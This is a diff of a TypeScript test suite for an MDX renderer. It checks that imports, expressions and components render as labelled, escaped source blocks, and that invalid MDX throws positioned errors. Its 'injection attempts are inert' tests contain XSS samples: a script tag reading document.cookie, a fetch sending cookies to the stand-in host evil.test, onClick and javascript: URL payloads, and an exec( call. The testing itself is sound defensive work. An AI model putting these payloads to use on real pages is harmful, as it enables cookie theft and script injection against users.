@@ -418,7 +418,8 @@ describe("MDX", () => {
   const doc = mdx(mdxDocusaurus);
   const out = toHtml(doc.tree).replace(/ data-rr-(id="\d+"|unmapped)/g, "");
   const lineOf = (text: string) => mdxDocusaurus.split("\n").findIndex((l) => l.startsWith(text)) + 1;
-  const at = (l: number) => blocksForLines(doc, l, l).map((n) => `${n.type}:${n.text.split("\n")[0]}`);
+  const at = (l: number) => blocksForLines(doc, l, l).map((n) => `${n.type}:${n.text}`);
+  const starting = (s: string) => expect.stringMatching(new RegExp(`^${s.replace(/[.*+?^${}()|[\]\\/]/g, "\\$&")}`));
 
   test("Markdown files are parsed as Markdown, not MDX", () => {
     const out = toHtml(renderMarkdown("Braces {1 + 1} and <Tabs /> stay Markdown.").tree);
@@ -428,25 +429,25 @@ describe("MDX", () => {
 
   test("imports and exports show as a labelled, inert source block", () => {
     expect(html("import Tabs from '@theme/Tabs';\nexport const a = 1;\n")).toBe(
-      '<div class="rr-mdx"><span class="rr-mdx-label">MDX import/export</span><pre><code>import Tabs from \'@theme/Tabs\';\nexport const a = 1;\n</code></pre></div>',
+      '<div class="rr-mdx"><span class="rr-mdx-label">MDX import/export</span><pre><code>import Tabs from \'@theme/Tabs\';\nexport const a = 1;</code></pre></div>',
     );
   });
 
   test("flow expressions show as a labelled source block", () => {
     expect(html("{/* note */}")).toBe(
-      '<div class="rr-mdx"><span class="rr-mdx-label">MDX expression</span><pre><code>{/* note */}\n</code></pre></div>',
+      '<div class="rr-mdx"><span class="rr-mdx-label">MDX expression</span><pre><code>{/* note */}</code></pre></div>',
     );
   });
 
   test("a component without children shows its source, labelled with its name", () => {
-    expect(html('<DocCardList items={[1]} />')).toBe(
-      '<div class="rr-mdx"><span class="rr-mdx-label">MDX component &#x3C;DocCardList></span><pre><code>&#x3C;DocCardList items={[1]} />\n</code></pre></div>',
+    expect(html("<DocCardList items={[1]} />")).toBe(
+      '<div class="rr-mdx"><span class="rr-mdx-label">MDX component &#x3C;DocCardList></span><pre><code>&#x3C;DocCardList items={[1]} /></code></pre></div>',
     );
   });
 
   test("a component's Markdown children render between its tags' source", () => {
     expect(html('<Tabs groupId="pm">\n\nSome *text*.\n\n</Tabs>')).toBe(
-      '<div class="rr-mdx"><span class="rr-mdx-label">MDX component &#x3C;Tabs></span><pre><code>&#x3C;Tabs groupId="pm">\n</code></pre>\n<p>Some <em>text</em>.</p>\n<pre><code>&#x3C;/Tabs>\n</code></pre></div>',
+      '<div class="rr-mdx"><span class="rr-mdx-label">MDX component &#x3C;Tabs></span><pre><code>&#x3C;Tabs groupId="pm"></code></pre><p>Some <em>text</em>.</p><pre><code>&#x3C;/Tabs></code></pre></div>',
     );
   });
 
@@ -476,19 +477,24 @@ describe("MDX", () => {
   });
 
   test("line comments resolve to inert blocks and to Markdown inside components", () => {
-    expect(at(lineOf("import TabItem"))).toEqual(["mdxjsEsm:MDX import/export"]);
-    expect(at(lineOf("<Tabs "))).toEqual(["mdxJsxFlowElement:MDX component <Tabs>"]);
-    expect(at(lineOf('  <TabItem value="yarn"'))).toEqual(["mdxJsxFlowElement:MDX component <TabItem>"]);
+    expect(at(lineOf("import TabItem"))).toEqual([starting("mdxjsEsm:MDX import/exportimport Tabs")]);
+    expect(at(lineOf("<Tabs "))).toEqual([starting("mdxJsxFlowElement:MDX component <Tabs><Tabs groupId")]);
+    expect(at(lineOf('  <TabItem value="yarn"'))).toEqual([
+      starting('mdxJsxFlowElement:MDX component <TabItem><TabItem value="yarn"'),
+    ]);
     expect(at(lineOf("Install with npm"))).toEqual(["paragraph:Install with npm:"]);
-    expect(at(lineOf("npm install"))).toEqual(["code:npm install @docusaurus/core"]);
-    expect(at(lineOf("{/*"))).toEqual(["mdxFlowExpression:MDX expression"]);
-    expect(at(lineOf("<DocCardList"))).toEqual(["mdxJsxFlowElement:MDX component <DocCardList>"]);
-    expect(at(lineOf("Use <Highlight"))).toEqual([expect.stringMatching(/^paragraph:Use MDX<Highlight/)]);
+    expect(at(lineOf("npm install"))).toEqual([starting("code:npm install @docusaurus/core")]);
+    expect(at(lineOf("{/*"))).toEqual([starting("mdxFlowExpression:MDX expression{/*")]);
+    expect(at(lineOf("<DocCardList"))).toEqual([starting("mdxJsxFlowElement:MDX component <DocCardList>")]);
+    expect(at(lineOf("Use <Highlight"))).toEqual([starting("paragraph:Use MDX<Highlight")]);
   });
 
   test("invalid MDX throws a concise error with its position", () => {
-    expect(() => mdx("# Title\n\n<Tabs>\n\nNever closed.\n")).toThrow(/^Invalid MDX at line \d+, column \d+: .+/);
-    expect(() => mdx("Bad {expression\n")).toThrow(/^Invalid MDX/);
+    expect(() => mdx("Bad {expression\n")).toThrow(/^Invalid MDX at line 1, column 16: Unexpected end of file/);
+    // Some errors carry their position only in the reason.
+    expect(() => mdx("# Title\n\n<Tabs>\n\nNever closed.\n")).toThrow(
+      "Invalid MDX: Expected a closing tag for `<Tabs>` (3:1-3:7)",
+    );
   });
 
   describe("injection attempts are inert", () => {
@@ -514,7 +520,8 @@ describe("MDX", () => {
     test("the JSX, ESM and expressions show as escaped source text", () => {
       expect(out).toContain("export default function Layout({ children }) { exec(");
       expect(out).toContain("&#x3C;div onClick={() => alert(1)} dangerouslySetInnerHTML=");
-      expect(out).toContain("&#x3C;script>{`alert(document.cookie)`}&#x3C;/script>");
+      expect(out).toContain(">&#x3C;script></code>");
+      expect(out).toContain(">{`alert(document.cookie)`}</code>");
       expect(out).toContain("{fetch('https://evil.test/' + document.cookie)}");
       expect(out).toContain('&#x3C;a href="javascript:alert(2)">inline&#x3C;/a>');
     });
